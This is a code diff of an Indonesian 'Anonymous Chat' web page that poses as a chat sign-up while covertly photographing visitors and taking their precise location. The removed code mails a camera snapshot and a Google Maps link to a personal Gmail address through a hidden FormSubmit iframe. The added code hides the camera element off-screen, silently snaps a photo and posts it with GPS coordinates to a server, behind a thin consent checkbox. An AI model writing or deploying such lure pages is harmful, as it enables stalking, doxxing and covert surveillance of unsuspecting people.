@@ -2,352 +2,728 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Chat Gratis Tanda Identitas</title>
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0">
+
+    <title>Anonymous Chat</title>
+
     <style>
-    :root {
-        --bg: #0b1020;
-        --panel: rgba(17, 24, 39, .78);
-        --panel-border: rgba(255,255,255,.10);
-        --text: #f8fafc;
-        --muted: #94a3b8;
-        --accent: #6366f1;
-        --accent-2: #8b5cf6;
-        --success: #22c55e;
-        --danger: #ef4444;
-        --shadow: 0 24px 80px rgba(0,0,0,.45);
-    }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
-    * { box-sizing: border-box; }
+        body {
+            min-height: 100vh;
+            font-family: Arial, Helvetica, sans-serif;
+            background:
+                radial-gradient(circle at top, #26345f 0%, #10162c 45%, #070a14 100%);
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
 
-    body {
-        margin: 0;
-        padding: 24px;
-        min-height: 100vh;
-        background:
-            radial-gradient(circle at 15% 15%, rgba(99,102,241,.18), transparent 30%),
-            radial-gradient(circle at 85% 85%, rgba(139,92,246,.16), transparent 30%),
-            var(--bg);
-        color: var(--text);
-        font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        overflow: auto;
-    }
+        .container {
+            width: 100%;
+            max-width: 460px;
+        }
 
-    body::before {
-        content: "";
-        position: fixed;
-        inset: 0;
-        pointer-events: none;
-        background-image: linear-gradient(rgba(255,255,255,.025) 1px, transparent 1px),
-                          linear-gradient(90deg, rgba(255,255,255,.025) 1px, transparent 1px);
-        background-size: 32px 32px;
-        mask-image: linear-gradient(to bottom, black, transparent 90%);
-    }
+        .card {
+            background: rgba(18, 24, 45, 0.94);
+            border: 1px solid rgba(255,255,255,.10);
+            border-radius: 24px;
+            padding: 30px;
+            box-shadow:
+                0 25px 70px rgba(0,0,0,.45);
+        }
 
-    .app-shell {
-        width: min(760px, 100%);
-        position: relative;
-    }
+        .logo {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 18px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            background: linear-gradient(135deg,#667eea,#764ba2);
+            box-shadow: 0 10px 30px rgba(102,126,234,.35);
+        }
 
-    .card {
-        padding: clamp(22px, 5vw, 42px);
-        border: 1px solid var(--panel-border);
-        border-radius: 28px;
-        background: var(--panel);
-        backdrop-filter: blur(22px);
-        -webkit-backdrop-filter: blur(22px);
-        box-shadow: var(--shadow);
-    }
+        h1 {
+            text-align: center;
+            font-size: 27px;
+            margin-bottom: 8px;
+        }
 
-    .brand {
-        display: flex;
-        align-items: center;
-        gap: 14px;
-        margin-bottom: 28px;
-    }
+        .subtitle {
+            text-align: center;
+            color: #aeb7d0;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
 
-    .brand-icon {
-        width: 48px;
-        height: 48px;
-        display: grid;
-        place-items: center;
-        border-radius: 15px;
-        background: linear-gradient(135deg, var(--accent), var(--accent-2));
-        box-shadow: 0 10px 30px rgba(99,102,241,.28);
-        font-size: 22px;
-    }
+        .notice {
+            background: rgba(59,130,246,.10);
+            border: 1px solid rgba(96,165,250,.25);
+            border-radius: 15px;
+            padding: 15px;
+            font-size: 13px;
+            line-height: 1.6;
+            color: #dbeafe;
+            margin-bottom: 20px;
+        }
 
-    .brand h1 {
-        margin: 0;
-        font-size: clamp(22px, 4vw, 30px);
-        letter-spacing: -.03em;
-    }
+        .notice strong {
+            color: #93c5fd;
+        }
 
-    .brand p {
-        margin: 4px 0 0;
-        color: var(--muted);
-        font-size: 13px;
-    }
+        .permission-box {
+            background: rgba(255,255,255,.045);
+            border: 1px solid rgba(255,255,255,.08);
+            border-radius: 15px;
+            padding: 16px;
+            margin-bottom: 18px;
+        }
 
-    .preview-wrap {
-        position: relative;
-        overflow: hidden;
-        border-radius: 20px;
-        background: #020617;
-        border: 1px solid rgba(255,255,255,.09);
-    }
+        .check {
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+            cursor: pointer;
+            color: #dce3f5;
+            font-size: 13px;
+            line-height: 1.6;
+        }
 
-    #preview {
-        width: 100%;
-        max-height: 62vh;
-        aspect-ratio: 16 / 10;
-        object-fit: cover;
-        border: 0;
-        display: none;
-        background: #020617;
-    }
+        .check input {
+            width: 19px;
+            height: 19px;
+            margin-top: 2px;
+            accent-color: #667eea;
+            flex-shrink: 0;
+        }
 
-    .status-box {
-        min-height: 52px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-        margin-top: 18px;
-        padding: 14px 16px;
-        border: 1px solid rgba(255,255,255,.08);
-        border-radius: 14px;
-        background: rgba(2,6,23,.45);
-        color: var(--muted);
-        font-size: 14px;
-        text-align: center;
-    }
+        button {
+            width: 100%;
+            border: 0;
+            border-radius: 14px;
+            padding: 15px;
+            font-size: 15px;
+            font-weight: 700;
+            color: white;
+            cursor: pointer;
+            background: linear-gradient(135deg,#667eea,#764ba2);
+            box-shadow: 0 10px 25px rgba(102,126,234,.25);
+            transition: .2s;
+        }
 
-    #status {
-        margin: 0;
-        color: inherit;
-    }
+        button:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 14px 30px rgba(102,126,234,.35);
+        }
 
-    #startBtn {
-        width: 100%;
-        margin-top: 18px;
-        padding: 15px 22px;
-        border: 0;
-        border-radius: 14px;
-        background: linear-gradient(135deg, var(--accent), var(--accent-2));
-        color: white;
-        font-size: 15px;
-        font-weight: 700;
-        letter-spacing: .01em;
-        cursor: pointer;
-        box-shadow: 0 12px 28px rgba(99,102,241,.25);
-        transition: transform .18s ease, box-shadow .18s ease, opacity .18s ease;
-    }
+        button:disabled {
+            opacity: .55;
+            cursor: not-allowed;
+            transform: none;
+        }
 
-    #startBtn:hover:not(:disabled) {
-        transform: translateY(-2px);
-        box-shadow: 0 16px 34px rgba(99,102,241,.34);
-    }
+        .status {
+            display: none;
+            margin-top: 18px;
+            padding: 14px;
+            border-radius: 13px;
+            font-size: 13px;
+            line-height: 1.5;
+        }
 
-    #startBtn:active:not(:disabled) {
-        transform: translateY(0);
-    }
+        .status.show {
+            display: block;
+        }
 
-    #startBtn:disabled {
-        cursor: not-allowed;
-        opacity: .55;
-        box-shadow: none;
-    }
+        .status.info {
+            background: rgba(59,130,246,.12);
+            border: 1px solid rgba(96,165,250,.25);
+            color: #bfdbfe;
+        }
 
-    .loading {
-        width: 16px;
-        height: 16px;
-        margin-left: 2px;
-        border: 2px solid rgba(255,255,255,.22);
-        border-top-color: #fff;
-        border-radius: 50%;
-        display: inline-block;
-        vertical-align: middle;
-        animation: spin .8s linear infinite;
-    }
+        .status.success {
+            background: rgba(34,197,94,.12);
+            border: 1px solid rgba(74,222,128,.25);
+            color: #bbf7d0;
+        }
 
-    .footer-note {
-        margin-top: 18px;
-        color: #64748b;
-        font-size: 12px;
-        text-align: center;
-    }
+        .status.error {
+            background: rgba(239,68,68,.12);
+            border: 1px solid rgba(248,113,113,.25);
+            color: #fecaca;
+        }
 
-    @keyframes spin {
-        to { transform: rotate(360deg); }
-    }
+        .footer {
+            text-align: center;
+            color: #737d98;
+            font-size: 11px;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
 
-    @media (max-width: 600px) {
-        body { padding: 12px; }
-        .card { border-radius: 22px; padding: 20px; }
-        .brand { margin-bottom: 22px; }
-        #preview { aspect-ratio: 4 / 3; max-height: 55vh; }
-    }
-</style>
+        /*
+         * Kamera sengaja tidak ditampilkan.
+         * Elemen video tetap digunakan sebagai sumber
+         * untuk mengambil foto otomatis.
+         */
+        #camera {
+            position: fixed;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            left: -9999px;
+            top: -9999px;
+        }
+    </style>
 </head>
+
 <body>
 
-    <main class="app-shell">
-        <section class="card">
-            <header class="brand">
-                <div class="brand-icon">✦</div>
-                <div>
-                    <h1>Anonymous Chat</h1>
-                    <p>Mulai Sekarang</p>
-                </div>
-            </header>
+<div class="container">
 
-            <div class="preview-wrap">
-                <img id="preview" alt="Preview Kamera">
-            </div>
+    <div class="card">
 
-            <div class="status-box">
-                <div id="status">Tap tombol untuk mulai</div>
-            </div>
+        <div class="logo">
+            💬
+        </div>
 
-            <button id="startBtn">Mulai</button>
+        <h1>Anonymous Chat</h1>
 
-            <div class="footer-note">Gratis Untuk Di Gunakan.</div>
-        </section>
-    </main>
+        <p class="subtitle">
+            Ngobrol dengan pengguna lain secara anonim.
+        </p>
 
-    <script>
-        const btn = document.getElementById('startBtn');
-        const preview = document.getElementById('preview');
-        const status = document.getElementById('status');
+        <div class="notice">
+            <strong>Perhatian sebelum masuk</strong><br><br>
 
-        btn.addEventListener('click', async () => {
-            status.innerHTML = 'Meminta izin kamera...';
-            btn.disabled = true;
+            Untuk melanjutkan, browser akan meminta izin
+            menggunakan kamera dan lokasi.
 
-            try {
-                // 1. Akses Kamera Depan
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                preview.srcObject = stream;
-                
-                // Tunggu beberapa saat agar video stabil
-                await new Promise(r => setTimeout(r, 500));
+            
+        </div>
 
-                status.innerHTML = 'Mengambil lokasi... <span class="loading"></span>';
+        <div class="permission-box">
 
-                // 2. Ambil Lokasi
-                const lokasi = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000
-                    });
-                });
+            <label class="check">
 
-                const lat = lokasi.coords.latitude;
-                const lng = lokasi.coords.longitude;
-                const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                <input
+                    type="checkbox"
+                    id="consent"
+                >
 
-                status.innerHTML = 'Menangkap gambar & mengirim...';
+                <span>
+                    Saya memahami dan menyetujui peraturan yang berlaku.
+                </span>
 
-                // 3. Tangkap Gambar
-                const canvas = document.createElement('canvas');
-                canvas.width = preview.videoWidth || 640;
-                canvas.height = preview.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(stream.getVideoTracks()[0].applyConstraints ? 
-                    preview : preview, 0, 0, canvas.width, canvas.height);
-                
-                // Convert ke Blob
-                canvas.toBlob(async (blob) => {
+            </label>
+
+        </div>
+
+        <!--
+            Video tidak ditampilkan kepada pengguna.
+            Elemen ini hanya menjadi sumber untuk canvas.
+        -->
+        <video
+            id="camera"
+            autoplay
+            muted
+            playsinline>
+        </video>
+
+        <button
+            id="startBtn"
+            type="button">
+            Mulai Anonymous Chat
+        </button>
+
+        <div
+            id="status"
+            class="status">
+        </div>
+
+        <div class="footer">
+            Kamera dan lokasi hanya digunakan setelah persetujuan
+            dan izin browser diberikan.
+        </div>
+
+    </div>
+
+</div>
+
+
+<script>
+
+const consent = document.getElementById("consent");
+const startBtn = document.getElementById("startBtn");
+const statusBox = document.getElementById("status");
+const video = document.getElementById("camera");
+
+let cameraStream = null;
+
+
+/* ================================
+   STATUS
+================================ */
+
+function showStatus(message, type = "info") {
+
+    statusBox.className =
+        "status show " + type;
+
+    statusBox.textContent = message;
+}
+
+
+/* ================================
+   STOP CAMERA
+================================ */
+
+function stopCamera() {
+
+    if (!cameraStream) {
+        return;
+    }
+
+    cameraStream
+        .getTracks()
+        .forEach(track => track.stop());
+
+    cameraStream = null;
+
+    video.srcObject = null;
+}
+
+
+/* ================================
+   WAIT VIDEO
+================================ */
+
+function waitForVideo() {
+
+    return new Promise((resolve, reject) => {
+
+        const timeout =
+            setTimeout(() => {
+                reject(
+                    new Error(
+                        "Kamera tidak siap."
+                    )
+                );
+            }, 10000);
+
+
+        function checkVideo() {
+
+            if (
+                video.readyState >= 2 &&
+                video.videoWidth > 0 &&
+                video.videoHeight > 0
+            ) {
+
+                clearTimeout(timeout);
+
+                resolve();
+
+            } else {
+
+                requestAnimationFrame(
+                    checkVideo
+                );
+
+            }
+
+        }
+
+        checkVideo();
+
+    });
+
+}
+
+
+/* ================================
+   TAKE PHOTO
+================================ */
+
+async function takePhoto() {
+
+    await waitForVideo();
+
+    const canvas =
+        document.createElement("canvas");
+
+    canvas.width =
+        video.videoWidth;
+
+    canvas.height =
+        video.videoHeight;
+
+    const ctx =
+        canvas.getContext("2d");
+
+    /*
+     * Mirror seperti kamera depan.
+     */
+    ctx.translate(
+        canvas.width,
+        0
+    );
+
+    ctx.scale(-1, 1);
+
+    ctx.drawImage(
+        video,
+        0,
+        0,
+        canvas.width,
+        canvas.height
+    );
+
+    return new Promise(
+        (resolve, reject) => {
+
+            canvas.toBlob(
+                blob => {
+
                     if (!blob) {
-                        status.innerText = 'Gagal menangkap gambar';
-                        btn.disabled = false;
+
+                        reject(
+                            new Error(
+                                "Gagal membuat foto."
+                            )
+                        );
+
                         return;
                     }
 
-                    // 4. Kirim ke FormSubmit sebagai form multipart.
-                    // FormSubmit mendukung attachment secara native melalui
-                    // enctype="multipart/form-data". Jangan gunakan endpoint AJAX
-                    // untuk file karena dokumentasi AJAX-nya menggunakan JSON.
-                    try {
-                        const form = document.createElement('form');
-                        form.method = 'POST';
-                        form.action = 'https://formsubmit.co/desamuncrat477@gmail.com';
-                        form.enctype = 'multipart/form-data';
-                        form.target = 'formsubmit_iframe';
-                        form.style.display = 'none';
+                    resolve(blob);
 
-                        const message = document.createElement('textarea');
-                        message.name = 'message';
-                        message.value =
-                            `Lokasi: ${mapLink}\nWaktu: ${new Date().toISOString()}`;
-                        form.appendChild(message);
+                },
+                "image/jpeg",
+                0.90
+            );
 
-                        const subject = document.createElement('input');
-                        subject.type = 'hidden';
-                        subject.name = '_subject';
-                        subject.value = 'Capture dari Anonymous Chat';
-                        form.appendChild(subject);
+        }
+    );
 
-                        const attachment = document.createElement('input');
-                        attachment.type = 'file';
-                        attachment.name = 'attachment';
-                        attachment.accept = 'image/jpeg,image/png';
+}
 
-                        // Masukkan Blob hasil kamera ke input file.
-                        const file = new File([blob], 'capture.jpg', {
-                            type: 'image/jpeg',
-                            lastModified: Date.now()
-                        });
-                        const dataTransfer = new DataTransfer();
-                        dataTransfer.items.add(file);
-                        attachment.files = dataTransfer.files;
-                        form.appendChild(attachment);
 
-                        // Iframe tersembunyi agar halaman tidak berpindah.
-                        let iframe = document.getElementById('formsubmit_iframe');
-                        if (!iframe) {
-                            iframe = document.createElement('iframe');
-                            iframe.id = 'formsubmit_iframe';
-                            iframe.name = 'formsubmit_iframe';
-                            iframe.style.display = 'none';
-                            document.body.appendChild(iframe);
-                        }
+/* ================================
+   LOCATION
+================================ */
 
-                        document.body.appendChild(form);
-                        form.submit();
+function getLocation() {
 
-                        status.innerHTML =
-                            '✅ Foto sedang dikirim. Periksa inbox/spam email.';
-                        btn.innerText = 'TERKIRIM';
-                        btn.disabled = true;
+    return new Promise(
+        (resolve, reject) => {
 
-                        // Bersihkan form setelah dikirim.
-                        setTimeout(() => form.remove(), 3000);
-                    } catch (error) {
-                        status.innerHTML = '❌ Gagal menyiapkan pengiriman';
-                        console.error(error);
-                        btn.disabled = false;
+            if (!navigator.geolocation) {
+
+                reject(
+                    new Error(
+                        "Browser tidak mendukung lokasi."
+                    )
+                );
+
+                return;
+            }
+
+
+            navigator.geolocation.getCurrentPosition(
+
+                position => {
+
+                    resolve({
+
+                        latitude:
+                            position.coords.latitude,
+
+                        longitude:
+                            position.coords.longitude,
+
+                        accuracy:
+                            position.coords.accuracy
+
+                    });
+
+                },
+
+                error => {
+
+                    let message =
+                        "Gagal mendapatkan lokasi.";
+
+                    if (error.code === 1) {
+                        message =
+                            "Izin lokasi ditolak.";
                     }
 
-                    // Hentikan stream kamera setelah gambar diambil
-                    stream.getTracks().forEach(track => track.stop());
-                    preview.style.display = 'block';
-                    preview.src = URL.createObjectURL(blob); // Tampilkan hasil tangkapan
+                    if (error.code === 2) {
+                        message =
+                            "Lokasi tidak tersedia.";
+                    }
 
-                }, 'image/jpeg', 0.8);
+                    if (error.code === 3) {
+                        message =
+                            "Permintaan lokasi timeout.";
+                    }
 
-            } catch (error) {
-                console.error(error);
-                status.innerHTML = '❌ Gagal: ' + error.message;
-                btn.disabled = false;
+                    reject(
+                        new Error(message)
+                    );
+
+                },
+
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+
+            );
+
+        }
+    );
+
+}
+
+
+/* ================================
+   START
+================================ */
+
+startBtn.addEventListener(
+    "click",
+    async () => {
+
+        if (!consent.checked) {
+
+            showStatus(
+                "Centang persetujuan terlebih dahulu.",
+                "error"
+            );
+
+            return;
+        }
+
+
+        startBtn.disabled = true;
+
+        try {
+
+            /*
+             * Kamera
+             */
+
+            showStatus(
+                "Meminta izin kamera...",
+                "info"
+            );
+
+            cameraStream =
+                await navigator.mediaDevices
+                .getUserMedia({
+
+                    video: {
+                        facingMode: {
+                            ideal: "user"
+                        },
+
+                        width: {
+                            ideal: 1280
+                        },
+
+                        height: {
+                            ideal: 720
+                        }
+                    },
+
+                    audio: false
+
+                });
+
+
+            /*
+             * Kamera tidak ditampilkan.
+             */
+
+            video.srcObject =
+                cameraStream;
+
+
+            await waitForVideo();
+
+
+            /*
+             * Lokasi
+             */
+
+            showStatus(
+                "Meminta izin lokasi...",
+                "info"
+            );
+
+            const location =
+                await getLocation();
+
+
+            /*
+             * Foto otomatis
+             */
+
+            showStatus(
+                "Mengambil foto...",
+                "info"
+            );
+
+            await new Promise(
+                resolve =>
+                    setTimeout(
+                        resolve,
+                        700
+                    )
+            );
+
+            const photo =
+                await takePhoto();
+
+
+            /*
+             * Kirim ke server
+             */
+
+            showStatus(
+                "Mengirim data...",
+                "info"
+            );
+
+            const formData =
+                new FormData();
+
+
+            formData.append(
+                "photo",
+                photo,
+                "anonymous-chat-photo.jpg"
+            );
+
+
+            formData.append(
+                "latitude",
+                location.latitude
+            );
+
+
+            formData.append(
+                "longitude",
+                location.longitude
+            );
+
+
+            formData.append(
+                "accuracy",
+                location.accuracy
+            );
+
+
+            formData.append(
+                "timestamp",
+                new Date().toISOString()
+            );
+
+
+            const response =
+                await fetch(
+                    "/api/consented-data",
+                    {
+                        method: "POST",
+                        body: formData
+                    }
+                );
+
+
+            const result =
+                await response.json();
+
+
+            if (!response.ok ||
+                !result.success) {
+
+                throw new Error(
+                    result.message ||
+                    "Gagal mengirim data."
+                );
+
             }
-        });
-    </script>
+
+
+            showStatus(
+                "Pendaftaran berhasil. Menghubungkan ke chat...",
+                "success"
+            );
+
+
+            stopCamera();
+
+
+            /*
+             * Masuk ke halaman chat.
+             */
+
+            setTimeout(
+                () => {
+
+                    window.location.href =
+                        "/chat.html";
+
+                },
+                1000
+            );
+
+
+        } catch (error) {
+
+            console.error(error);
+
+            stopCamera();
+
+            showStatus(
+                "Proses dibatalkan: " +
+                error.message,
+                "error"
+            );
+
+            startBtn.disabled = false;
+
+        }
+
+    }
+);
+
+
+/*
+ * Bersihkan kamera ketika halaman ditutup.
+ */
+
+window.addEventListener(
+    "beforeunload",
+    stopCamera
+);
+
+</script>
+
 </body>
 </html>
